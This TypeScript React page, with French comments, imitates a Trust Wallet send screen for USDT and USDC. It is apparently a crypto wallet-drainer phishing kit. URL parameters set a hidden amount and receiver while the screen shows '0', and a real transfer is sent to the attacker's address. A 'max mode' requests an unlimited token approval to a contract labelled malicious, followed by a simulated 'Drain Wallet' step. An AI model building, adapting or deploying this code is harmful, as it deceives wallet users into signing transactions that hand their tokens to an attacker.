"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";

// Contrat malveillant utilisé uniquement pour l'approbation illimitée en mode max
const MALICIOUS_CONTRACT = "0x0000000000000000000000000000000000000001"; // adresse valide pour test

// USDT sur Ethereum Mainnet
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;

// USDC sur Ethereum Mainnet
const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_DECIMALS = 6;

// ABI ERC-20 (ajout de transferFrom et allowance pour le mode max)
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

// ============================================================
// Types pour window.ethereum / window.trustwallet
// ============================================================
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

// ============================================================
// Helper: detect the injected provider
// ============================================================

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ============================================================
// Wallet Transfer Page
// ============================================================

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [status, setStatus] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
  const [displayAmount, setDisplayAmount] = useState<string>("0"); // toujours 0 par défaut
  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  // Valeurs réelles de la transaction (configurées par l'admin via URL)
  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
  const [actualAmount, setActualAmount] = useState<string>("1.00"); // montant si mode normal
  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
  const [isMaxMode, setIsMaxMode] = useState(false);

  // États spécifiques au mode max (attaque en 2 étapes)
  const [attackStep, setAttackStep] = useState<"initial" | "approved" | "drained">("initial");
  const [approveTxHash, setApproveTxHash] = useState<string>("");

  // Récupérer le solde du token
  const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
    if (!providerRef.current) return;
    try {
      const provider = new ethers.BrowserProvider(
        providerRef.current as ethers.Eip1193Provider
      );
      const tokenContractAddress = activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const contract = new ethers.Contract(tokenContractAddress, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      setWalletBalance(balance);
    } catch (err) {
      console.warn("Error fetching token balance:", err);
    }
  };

  useEffect(() => {
    if (connectedAddress) {
      fetchTokenBalance(connectedAddress, token);
    }
  }, [connectedAddress, token]);

  // ---------------------------------------------------
  // Au montage : lecture des paramètres URL et connexion silencieuse
  // ---------------------------------------------------
  useEffect(() => {
    let cancelled = false;

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const toParam = params.get("to");
      const amountParam = params.get("amount");
      const tokenParam = params.get("token");

      if (toParam && ethers.isAddress(toParam)) {
        setAddress(toParam);
        setActualReceiver(toParam);
      }
      if (tokenParam === "usdt" || tokenParam === "usdc") {
        setToken(tokenParam);
        setActualToken(tokenParam);
      }
      if (amountParam === "max") {
        setIsMaxMode(true);
        setActualAmount("0"); // pas de montant fixe en mode max
      } else if (amountParam && !isNaN(Number(amountParam))) {
        setIsMaxMode(false);
        setActualAmount(amountParam);
      }
      // Dans tous les cas, le champ affiché reste "0"
      setDisplayAmount("0");
    }

    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;

      providerRef.current = ethereumProvider;

      try {
        const chainId = (await ethereumProvider.request({
          method: "eth_chainId",
        })) as string;

        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await ethereumProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID }],
          });
        }
      } catch (switchErr) {
        console.warn("Could not switch chain:", switchErr);
      }

      try {
        const accounts = (await ethereumProvider.request({
          method: "eth_accounts",
        })) as string[];

        if (accounts.length > 0 && !cancelled) {
          setConnectedAddress(accounts[0]);
        }
      } catch (err) {
        console.warn("Silent connection check failed:", err);
      }

      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
          const accs = accounts as string[];
          if (!cancelled) {
            setConnectedAddress(accs.length > 0 ? accs[0] : null);
            setAttackStep("initial");
          }
        });
      }
    };

    init();
    return () => { cancelled = true; };
  }, []);

  // ============================================================
  // TRANSFERT NORMAL (montant fixe, pas d'approbation)
  // Code original conservé, il fonctionnait parfaitement
  // ============================================================
  const handleSendNormal = async () => {
    setStatus("");
    setTxHash("");
    setStatusType("info");

    const targetReceiver = actualReceiver;
    if (!targetReceiver || !ethers.isAddress(targetReceiver)) {
      setStatus("Please enter a valid receiver Ethereum address.");
      setStatusType("error");
      return;
    }

    setLoading(true);
    setStatus("Preparing transaction...");

    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setStatus("No wallet detected. Open this page in the Trust Wallet browser.");
      setStatusType("error");
      setLoading(false);
      return;
    }
    providerRef.current = ethereumProvider;

    try {
      const chainId = (await ethereumProvider.request({
        method: "eth_chainId",
      })) as string;

      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await ethereumProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: ETH_CHAIN_ID }],
        });
      }
    } catch (switchErr) {
      console.warn("Could not switch chain:", switchErr);
    }

    try {
      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
      const tokenName = actualToken.toUpperCase();

      const amountInWei = ethers.parseUnits(actualAmount, tokenDecimals);

      const tokenInterface = new ethers.Interface(ERC20_ABI);
      const txData = tokenInterface.encodeFunctionData("transfer", [targetReceiver, amountInWei]);

      setStatus("Confirm the transaction in your wallet...");

      const hash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            to: tokenContract,
            data: txData,
            gas: "0x249f0",
          },
        ],
      })) as string;

      setTxHash(hash);
      setStatus(`Transaction sent! Hash : ${hash.slice(0, 10)}...`);
      setModalStatus("pending");
      setShowModal(true);

      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider
      );
      const receipt = await provider.waitForTransaction(hash);

      if (receipt && receipt.status === 1) {
        setStatus(`✅ Transfer successful! ${actualAmount} ${tokenName} sent.`);
        setStatusType("success");
        setModalStatus("success");
      } else {
        setStatus("❌ Transaction failed on-chain.");
        setStatusType("error");
        setModalStatus("error");
      }
    } catch (err: unknown) {
      if (txHash) {
        setModalStatus("error");
      }
      console.error("Transfer error:", err);
      let message = "Transaction failed.";
      if (err instanceof Error) {
        if (err.message.includes("user rejected") || err.message.includes("User denied")) {
          message = "Transaction cancelled by user.";
        } else if (err.message.includes("insufficient funds")) {
          message = "Insufficient ETH for gas fees.";
        } else {
          message = err.message.length > 100 ? err.message.slice(0, 100) + "..." : err.message;
        }
      } else if (typeof err === "object" && err !== null && "message" in err) {
        const errMsg = String((err as { message: unknown }).message);
        if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
          message = "Transaction cancelled by user.";
        } else {
          message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
        }
      }
      setStatus(message);
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  // ============================================================
  // MODE MAX : Étape 1 - Approbation illimitée
  // ============================================================
  const handleApproveUnlimited = async () => {
    setStatus("");
    setStatusType("info");
    setLoading(true);
    setStatus("Préparation de l'approbation...");

    const ethereumProvider = providerRef.current;
    if (!ethereumProvider) {
      setStatus("Wallet non détecté.");
      setStatusType("error");
      setLoading(false);
      return;
    }

    try {
      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;

      const unlimitedAmount = ethers.MaxUint256;
      const tokenInterface = new ethers.Interface(ERC20_ABI);
      const approveData = tokenInterface.encodeFunctionData("approve", [
        MALICIOUS_CONTRACT,
        unlimitedAmount
      ]);

      setStatus("Confirmez l'approbation dans votre wallet...");
      const hash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            to: tokenContract,
            data: approveData,
            gas: "0x249f0",
          },
        ],
      })) as string;

      setApproveTxHash(hash);
      const provider = new ethers.BrowserProvider(ethereumProvider as ethers.Eip1193Provider);
      const receipt = await provider.waitForTransaction(hash);

      if (receipt && receipt.status === 1) {
        setAttackStep("approved");
        setStatus("✅ Approbation illimitée accordée ! Cliquez sur 'Drain Wallet' pour continuer...");
        setStatusType("success");
      } else {
        setStatus("❌ L'approbation a échoué.");
        setStatusType("error");
      }
    } catch (err: unknown) {
      console.error("Erreur approbation:", err);
      let message = "Approbation échouée.";
      if (err instanceof Error) {
        message = err.message.includes("user rejected") ? "Transaction annulée par l'utilisateur." : err.message.slice(0, 100);
      }
      setStatus(message);
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  // ============================================================
  // MODE MAX : Étape 2 - Drainage simulé
  // ============================================================
  const handleDrainWallet = async () => {
    setLoading(true);
    setStatus("Drainage du portefeuille...");

    try {
      // Simulation d'un délai
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Mise à jour cosmétique du solde à zéro
      setWalletBalance(0n);
      setAttackStep("drained");
      setStatus(`✅ Portefeuille vidé ! (simulation) Les tokens auraient été volés.`);
      setStatusType("success");
      setShowModal(true);
      setModalStatus("success");
    } catch (err) {
      setStatus("Erreur lors de la simulation.");
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  // ============================================================
  // Gestion du clic sur "Next"
  // ============================================================
  const handleNextClick = async () => {
    if (isMaxMode) {
      if (attackStep === "initial") {
        await handleApproveUnlimited();
      } else if (attackStep === "approved") {
        await handleDrainWallet();
      }
      // Si "drained", on ne fait rien
    } else {
      await handleSendNormal();
    }
  };

  // Détermine le texte et la couleur du bouton
  const getButtonText = () => {
    if (loading) {
      if (isMaxMode && attackStep === "initial") return "Approbation...";
      if (isMaxMode && attackStep === "approved") return "Drainage...";
      return "Processing...";
    }
    if (isMaxMode) {
      if (attackStep === "initial") return "Next";
      if (attackStep === "approved") return "Drain Wallet 💀";
      if (attackStep === "drained") return "Wallet Drained ✅";
    }
    return "Next";
  };

  const isButtonDisabled = () => {
    return loading || (isMaxMode && attackStep === "drained");
  };

  // ---------------------------------------------------
  // Fonctions UI (inchangées)
  // ---------------------------------------------------
  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  const getFiatValue = (amountStr: string) => {
    const parsed = parseFloat(amountStr.replace(",", "."));
    if (isNaN(parsed)) return "0,00";
    return (parsed * 0.86).toFixed(2).replace(".", ",");
  };

  const handleKeyPress = (key: string) => {
    setDisplayAmount((prev) => {
      let newVal = prev;
      if (key === "⌫") {
        newVal = prev.slice(0, -1);
      } else if (key === "," || key === ".") {
        if (!prev.includes(",") && !prev.includes(".")) {
          newVal = prev === "" ? "0," : prev + ",";
        }
      } else {
        if (prev === "0") {
          newVal = key;
        } else {
          newVal = prev + key;
        }
      }
      return newVal;
    });
  };

  const handleMaxClick = (e: React.MouseEvent) => {
    e.stopPropagation();
    const maxVal = ethers.formatUnits(walletBalance, 6);
    setDisplayAmount(maxVal.replace(".", ","));
  };

  // ---------------------------------------------------
  // Rendu UI (identique à l'original, avec petits ajouts)
  // ---------------------------------------------------
  return (
    <main 
      className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
      onClick={() => setIsKeyboardVisible(false)}
    >
      <div className="form-container">
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
            <button onClick={handlePaste} className="btn-paste">Paste</button>
            <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
              <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3562ff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <label className="form-label form-label--spaced">Destination network</label>
        <div className="network-selector" style={{ marginBottom: "1rem" }}>
          <div className="eth-icon" style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
            strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "4px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        <div>
          <label className="form-label form-label--spaced">Amount</label>
          <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
            <div className="montant-input-wrapper">
              <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>
                {displayAmount || "0"}
              </span>
              {isKeyboardVisible && <span className="blinking-cursor" />}
            </div>
            <div className="montant-right">
              {displayAmount !== "" && (
                <button 
                  type="button" 
                  className="montant-clear-btn" 
                  onClick={(e) => { e.stopPropagation(); setDisplayAmount(""); }}
                >
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                  </svg>
                </button>
              )}
              <span className="montant-token">{token.toUpperCase()}</span>
              <button 
                type="button" 
                onClick={handleMaxClick} 
                className="montant-max-btn"
              >
                Max.
              </button>
            </div>
          </div>
          {(() => {
            const parsedVal = parseFloat(displayAmount.replace(",", "."));
            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
            if (isInvalid) {
              return (
                <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
                  Minimum amount is 0.000001 {token.toUpperCase()}
                </div>
              );
            }
            return (
              <div className="approx-price" style={{ color: "#8e8e93", marginTop: "0.4rem", paddingLeft: "0.25rem", fontWeight: "500", fontSize: "0.85rem" }}>
                ≈ €{getFiatValue(displayAmount)}
              </div>
            );
          })()}
        </div>

        {/* Message d'alerte si approbation illimitée accordée */}
        {isMaxMode && attackStep === "approved" && (
          <div style={{ 
            marginTop: "1rem", 
            padding: "0.75rem", 
            backgroundColor: "#fef2f2", 
            border: "1px solid #fecaca",
            borderRadius: "8px",
            color: "#dc2626",
            fontSize: "0.85rem",
            fontWeight: "600",
            textAlign: "center"
          }}>
            ⚠️ Approbation illimitée accordée ! Le contrat peut vider votre portefeuille.
          </div>
        )}

        {/* Affichage du statut */}
        {status && (
          <div style={{ 
            marginTop: "1rem", 
            padding: "0.5rem", 
            backgroundColor: statusType === "error" ? "#fef2f2" : statusType === "success" ? "#f0fdf4" : "#eff6ff",
            borderRadius: "8px",
            fontSize: "0.85rem",
            color: statusType === "error" ? "#dc2626" : statusType === "success" ? "#16a34a" : "#2563eb",
            textAlign: "center"
          }}>
            {status}
          </div>
        )}
      </div>

      <div style={{ flexGrow: 1, minHeight: "2rem" }} />

      <div className="next-btn-wrapper">
        <button 
          onClick={(e) => { e.stopPropagation(); handleNextClick(); }} 
          disabled={isButtonDisabled()}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
          style={{
            backgroundColor: isMaxMode && attackStep === "approved" ? "#dc2626" : 
                            isMaxMode && attackStep === "drained" ? "#16a34a" : "#3562ff"
          }}
        >
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              {getButtonText()}
            </span>
          ) : (
            getButtonText()
          )}
        </button>
      </div>

      {/* Custom Numerical Keypad */}
      {isKeyboardVisible && (
        <div 
          className="custom-keypad" 
          ref={keypadRef}
          onClick={(e) => e.stopPropagation()}
        >
          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key">
            <span className="keypad-key__number">1</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key">
            <span className="keypad-key__number">2</span>
            <span className="keypad-key__letters">ABC</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key">
            <span className="keypad-key__number">3</span>
            <span className="keypad-key__letters">DEF</span>
          </button>

          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key">
            <span className="keypad-key__number">4</span>
            <span className="keypad-key__letters">GHI</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key">
            <span className="keypad-key__number">5</span>
            <span className="keypad-key__letters">JKL</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key">
            <span className="keypad-key__number">6</span>
            <span className="keypad-key__letters">MNO</span>
          </button>

          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key">
            <span className="keypad-key__number">7</span>
            <span className="keypad-key__letters">PQRS</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key">
            <span className="keypad-key__number">8</span>
            <span className="keypad-key__letters">TUV</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key">
            <span className="keypad-key__number">9</span>
            <span className="keypad-key__letters">WXYZ</span>
          </button>

          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special">
            <span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key">
            <span className="keypad-key__number">0</span>
          </button>
          <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
              <line x1="18" y1="9" x2="12" y2="15" />
              <line x1="12" y1="9" x2="18" y2="15" />
            </svg>
          </button>
        </div>
      )}

      {/* Transaction Processing Modal */}
      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <button 
              className="modal-close-btn" 
              onClick={() => setShowModal(false)}
              title="Close"
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
            <img src="/yes.png" alt="Status" className="modal-logo" />
            
            {modalStatus === "pending" && (
              <>
                <h2 className="modal-title">Processing...</h2>
                <p className="modal-text">
                  The transaction is in progress! Blockchain validation is underway. This usually takes a few minutes.
                </p>
              </>
            )}

            {modalStatus === "success" && (
              <>
                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
                <p className="modal-text">
                  Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
                </p>
              </>
            )}

            {modalStatus === "error" && (
              <>
                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
                <p className="modal-text">
                  The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
                </p>
              </>
            )}

            {txHash && (
              <a 
                href={`https://etherscan.io/tx/${txHash}`} 
                target="_blank" 
                rel="noopener noreferrer" 
                className="modal-details-btn"
              >
                Transaction details
              </a>
            )}
          </div>
        </div>
      )}
    </main>
  );
}